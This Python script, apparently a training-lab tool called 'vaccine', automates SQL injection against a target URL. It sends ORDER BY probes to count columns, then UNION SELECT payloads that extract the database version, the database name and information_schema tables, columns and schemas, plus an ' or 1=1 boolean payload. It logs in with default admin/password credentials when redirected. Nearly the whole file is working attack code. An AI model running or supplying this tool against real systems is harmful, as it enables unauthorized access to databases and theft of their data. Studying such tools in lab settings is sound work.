import argparse
import requests
import difflib
from bs4 import BeautifulSoup


def order_by(url, request, original_content, session):
    """
    Perform a SQL injection using ORDER BY clause.
    This is error based SQL injection that checks for the number of columns in the query.
    """
    print("\nORDER BY SQL Injection Attack:")
    payloads = [
        "' order by 1#",
        "' order by 2#",
        "' order by 3#",
        "' order by 4#",
        "' order by 5#",
    ]
    count = 0
    for payload in payloads:
        count += 1
        if request == 'GET':
            response = session.get(url, params={'id': payload, 'Submit': 'Submit'})
        else:
            response = session.post(url, data={'search': payload})
        print(f"Sending payload... ({payload})")
        if response.status_code == 200:
            diff = response.text.replace(original_content, '')
            if diff:
                print(f"Found difference:\n{diff}")
                return count - 1
            else:
                print("No difference found")
        else:
            print(f"vaccine: Error with payload ({payload}), status code {response.status_code}")
    return count - 1
            

def union(url, request, original_content, session, count):
    """
    Perform a SQL injection using UNION SELECT.
    """
    if count < 1:
        print("vaccine: Error: Not enough columns found for UNION SELECT attack.")
        return
    print("\nUNION SELECT SQL Injection Attack:")
    payloads = [
        "' union select " + ', '.join(['null'] * (count - 1)) + ", version()#",
        "' union select " + ', '.join(['null'] * (count - 1)) + ", database()#",
        "' union select " + ', '.join(['null'] * (count - 1)) + ", table_name from information_schema.tables#",
        "' union select " + ', '.join(['null'] * (count - 1)) + ", column_name from information_schema.columns#",
        "' union select " + ', '.join(['null'] * (count - 1)) + ", schema_name from information_schema.schemata#",
    ]
    for payload in payloads:
        if request == 'GET':
            response = session.get(url, params={'id': payload, 'Submit': 'Submit'})
        else:
            response = session.post(url, params={'id': payload})
        print(f"vaccine: Sending payload... ({payload})")
        if response.status_code == 200:
            diff = response.text.replace(original_content, '')
            if diff:
                soup = BeautifulSoup(response.text, 'html.parser')
                print(f"Found difference:\n{soup.find('pre').text}")
            else:
                print(f"No difference found: {payload}")
        else:
            print(f"vaccine: Error with payload ({payload}), status code {response.status_code}")

def boolean(url, request, original_content, session):
    """
    Perform a SQL injection using boolean-based blind SQL injection.
    """
    print("\nBoolean-Based SQL Injection Attack:")
    payloads = [
        "' or 1=1#",
    ]
    for payload in payloads:
        if request == 'GET':
            response = session.get(url, params={'id': payload, 'Submit': 'Submit'})
        else:
            response = session.post(url, data={'input': payload})
        print(f"vaccine: Sending payload... ({payload})")
        if response.status_code == 200:
            diff = response.text.replace(original_content, '')
            if diff:
                soup = BeautifulSoup(response.text, 'html.parser')
                # print all pre tags in the response
                print(f"Found difference:\n{soup.find_all('pre')}")
            else:
                print("No difference found")
        else:
            print(f"vaccine: Error with payload ({payload}), status code {response.status_code}")

            
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A program that performs a SQL injection.')
    parser.add_argument('URL', type=str, help='The URL to perform the SQL injection on.')
    parser.add_argument('-o', '--out', type=str, default='output.txt', help='The output file to save the results to.')
    parser.add_argument('-X', '--request', choices=['GET', 'POST'], default='GET', help='The HTTP request method to use (GET or POST).')
    args = parser.parse_args()

    try:
        session = requests.Session()
        response = session.get(args.URL)
        print(f"vaccine: Requesting URL: {args.URL} with method: {args.request}")
        if response.history:
            # When there are redirects, we assume that user needs to login
            print(f"vaccine: Warning: Redirects detected, attempting to login.")
            soup = BeautifulSoup(response.text, 'html.parser')
            user_token = soup.find('input', {'name': 'user_token'})['value'] if soup.find('input', {'name': 'user_token'}) else None
            response = session.post(response.url, data={'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': user_token})
            if response.status_code != 200:
                print(f"vaccine: Error: Unable to login, status code {response.status_code}")
                exit(1)
            print(f"vaccine: Successfully logged in, status code {response.status_code}")
            response = session.get(args.URL)
            if response.status_code != 200:
                print(f"vaccine: Error: Unable to login, status code {response.status_code}")
                exit(1)
        elif response.status_code != 200:
            print(f"vaccine: Error: Unexpected status code {response.status_code}")
            exit(1)
        original_content = response.text
        count = order_by(args.URL, args.request, original_content, session)
        union(args.URL, args.request, original_content, session, count)
        boolean(args.URL, args.request, original_content, session)
        
    except requests.RequestException as e:
        print(f"vaccine: Error: {e}")
        exit(1)

